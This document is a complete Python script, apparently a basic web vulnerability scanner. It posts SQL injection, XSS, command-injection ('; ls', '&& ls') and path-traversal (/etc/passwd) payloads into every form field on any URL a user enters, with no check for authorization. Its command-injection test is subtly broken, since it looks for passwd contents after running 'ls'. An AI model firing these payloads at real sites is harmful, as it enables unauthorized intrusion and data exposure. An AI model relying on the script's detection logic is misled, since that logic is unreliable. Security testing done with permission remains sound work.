import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# List of common payloads for different vulnerabilities
sql_payloads = ["'", "' OR '1'='1", "'; --", "' OR '1'='1' --"]
xss_payloads = ["<script>alert('XSS')</script>", "'><script>alert(1)</script>"]
cmd_injection_payloads = ["; ls", "&& ls", "| ls"]
lfi_payloads = ["../../../../etc/passwd", "../../../../../../../../etc/passwd"]

# Functions to check for vulnerabilities
def is_vulnerable_to_sql_injection(response):
    errors = ["You have an error in your SQL syntax", "Warning: mysql_fetch", "Unclosed quotation mark after the character string"]
    return any(error in response.text for error in errors)

def is_vulnerable_to_xss(response):
    return any(payload in response.text for payload in xss_payloads)

def is_vulnerable_to_cmd_injection(response):
    return "root:x:" in response.text

def is_vulnerable_to_lfi(response):
    return "root:x:" in response.text

# Scan functions
def scan_sql_injection(url, forms):
    for payload in sql_payloads:
        for form in forms:
            data = {input_tag['name']: payload for input_tag in form.find_all("input") if input_tag.get('name')}
            target_url = urljoin(url, form.get('action'))
            response = requests.post(target_url, data=data)
            if is_vulnerable_to_sql_injection(response):
                print(f"SQL Injection vulnerability found at: {target_url} with payload: {payload}")

def scan_xss(url, forms):
    for payload in xss_payloads:
        for form in forms:
            data = {input_tag['name']: payload for input_tag in form.find_all("input") if input_tag.get('name')}
            target_url = urljoin(url, form.get('action'))
            response = requests.post(target_url, data=data)
            if is_vulnerable_to_xss(response):
                print(f"XSS vulnerability found at: {target_url} with payload: {payload}")

def scan_cmd_injection(url, forms):
    for payload in cmd_injection_payloads:
        for form in forms:
            data = {input_tag['name']: payload for input_tag in form.find_all("input") if input_tag.get('name')}
            target_url = urljoin(url, form.get('action'))
            response = requests.post(target_url, data=data)
            if is_vulnerable_to_cmd_injection(response):
                print(f"Command Injection vulnerability found at: {target_url} with payload: {payload}")

def scan_lfi(url, forms):
    for payload in lfi_payloads:
        for form in forms:
            data = {input_tag['name']: payload for input_tag in form.find_all("input") if input_tag.get('name')}
            target_url = urljoin(url, form.get('action'))
            response = requests.post(target_url, data=data)
            if is_vulnerable_to_lfi(response):
                print(f"LFI vulnerability found at: {target_url} with payload: {payload}")

# Main function
def main():
    target_url = input("Enter the URL to scan (include http:// or https://): ")
    
    # Get all forms on the page
    response = requests.get(target_url)
    soup = BeautifulSoup(response.text, "html.parser")
    forms = soup.find_all("form")
    
    # Scan for various vulnerabilities
    print("\nScanning for SQL Injection vulnerabilities...")
    scan_sql_injection(target_url, forms)
    
    print("\nScanning for XSS vulnerabilities...")
    scan_xss(target_url, forms)
    
    print("\nScanning for Command Injection vulnerabilities...")
    scan_cmd_injection(target_url, forms)
    
    print("\nScanning for LFI vulnerabilities...")
    scan_lfi(target_url, forms)

if __name__ == "__main__":
    main()
